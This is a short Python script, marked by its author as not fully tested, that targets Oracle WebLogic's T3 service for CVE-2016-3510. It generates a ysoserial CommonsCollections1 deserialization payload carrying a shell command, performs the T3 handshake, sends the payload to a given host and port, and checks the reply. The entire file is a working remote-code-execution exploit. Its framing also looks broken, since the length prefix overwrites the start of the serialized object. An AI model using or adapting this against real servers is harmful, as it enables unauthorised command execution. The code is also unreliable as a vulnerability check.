#未完全测试
import sys
import socket
import struct
import os
from subprocess import check_output

def check(url, ip, port):

    try:
        ysoserial_path = './ysoserial-all.jar'  # 修改为实际的ysoserial路径

        #若执行了echo xss，说明漏洞存在
        payloadObj = check_output(['java', '-jar', ysoserial_path, 'CommonsCollections1', 'echo xss'])

        payload = b''
        payload += payloadObj
        payload += b''

        # adjust header for appropriate message length
        payload = struct.pack('!i', len(payload)) + payload[4:]

    
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, int(port)))

        # Send headers
        headers = 't3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://{0}:{1}\n\n'.format(ip, port)
        sock.sendall(headers.encode())

        data = sock.recv(1024)

        if 'AS:255' not in data.decode():
            return "未验证"

        # Send payload
        sock.send(payload)

        data = sock.recv(1024)
        if 'xss' in data.decode():
            return "CVE-2016-3510 vuln exists!"

    except Exception as e:
        print(e)
        return "未验证"

    return None